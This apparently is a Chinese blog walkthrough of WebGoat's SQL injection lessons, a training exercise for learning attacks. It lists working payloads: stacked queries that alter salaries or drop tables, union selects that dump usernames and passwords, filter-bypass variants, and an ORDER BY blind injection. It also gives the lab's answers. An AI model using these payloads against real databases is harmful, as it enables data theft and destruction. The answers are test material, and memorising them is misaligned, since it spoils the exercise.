# 原创
：  【webGoat靶场】SQL Injection

# 【webGoat靶场】SQL Injection

**目录**

[SQL](#SQL)

[SQL Injection (intro)](#lesson-title)

[SQL Injection (advanced)](#lesson-title)

[SQL Injection (mitigation)](#lesson-title)

---


## SQL

> 
<h3>SQL Injection (intro)</h3>
2、
select department from employees where first_name='Bob'; 

<hr/>
3、
update employees set department='Sales' where first_name='Tobi'; 

<hr/>
4、
alter table employees add column phone varchar(20); 

<hr/>
5、
grant insert on grant_rights  to unauthorized_user 

<hr/>
9、

<hr/>
 10、

<hr/>
11、

<hr/>
12、
Smith&amp;auth_tan=3SL99A'; update employees set salary = 999999 where last_name='Smith'; -- +

<hr/>
13、
1' drop table access_log;--+ 



---


---


---


---


 

> 
<h3>SQL Injection (advanced)</h3>
3、
Dave' OR 1=1;SELECT * FROM user_system_data;--


<hr/>
5、
先尝试是否可以注册相同的用户名
“Tom”可以注册
"tom"进行注册时，提示该用户已注册


因为tom是对的，所以使用or的话，就永真
tom' or '1'='1

 tom' or '1'='2


考虑使用and
（显示的页面不一样，说明注册中的name处存在注入点）
tom' and 1=1--+<img alt="" height="623" src="https://img-blog.csdnimg.cn/da6cbaad6751487f99a1781ea5f4216b.png" width="884"/>
 tom' and 1=2--+

接下来是bp抓包
1、然后保存到1.txt，再使用sqlmap跑
2、使用bp爆破
（不演示了）
tom
thisisasecretfortomonly

<hr/>
6、
43234





---


> 
<h3>SQL Injection (mitigation)</h3>
5、
getConnection
PreparedStatement ps
prepareStatement
?
?
ps.setString(1, name);
ps.setString(2, mail)


<hr/>
6、
try{ <br/>     Connection conn = null;<br/>     conn=DriverManager.getConnection(DBURL,DBUSER,DBPW);<br/>     PreparedStatement ps=conn.prepareStatement("select * from users where name=?");<br/>     ps.setString(1,"zy");<br/>     ResultSet rs=ps.executeQuery(); <br/> } catch(Exception e){ <br/>     System.out.println("zeze");<br/> }

<hr/>
9、
1'/**/;/**/select/**/user_name,password/**/from/**/user_system_data;--+
 <img alt="" height="345" src="https://img-blog.csdnimg.cn/1021bd02ea824fefb3ced11d341a6ae8.png" width="1177"/>

1'/**/union/**/select/**/1,user_name,password,'1','2','3',4/**/from/**/user_system_data--+

<hr/>
10、
1'/**/union/**/selselectect/**/1,user_name,password,'1','2','3',4/**/frfromom/**/user_system_data--+


 1'/**/;/**/seselectlect/**/user_name,password/**/frfromom/**/user_system_data;--+


<hr/>
12、
题目提示：
1、获取主机名为webgoat-prd的服务器的IP地址
2、Submit 不存在SQL 注入
3、此题都是排序，肯定和order by有关

点Hostname排序，并抓包
找到了hostname——&gt;column参数值是order by参数


 将hostname改为ip试试
（右侧出现排序结果）



此处被带入查询，使用不存在的列名，查看是否会报错
报出了查询语句
select id, hostname, ip, mac, status, description from servers  where status &lt;&gt; 'out of order' order by 1111


语法：select id, hostname, ip, mac, status, description from servers where status &lt;&gt; ‘out of order’ order by case when (true/false) then hostname else id end
order by后的条件，盲猜字段的每一个字符
when (true/false)真假判断，为true按hostname排序，为false按id排序

对ip进行盲注
ip最多有15位，每一位数是0-9
(case when (substring((select ip from servers where hostname=‘webgoat-prd’),1,1)=1) then hostname else id end)
(case%20when%20((select%20substring(ip,1,1)%20from%20servers%20where%20hostname=%27webgoat-prd%27)=1)%20then%20hostname%20else%20id%20end)

payload1

 payload2


查看回应包，成功排序的说明是我们需要的数值 
104.130.219.202




---


---

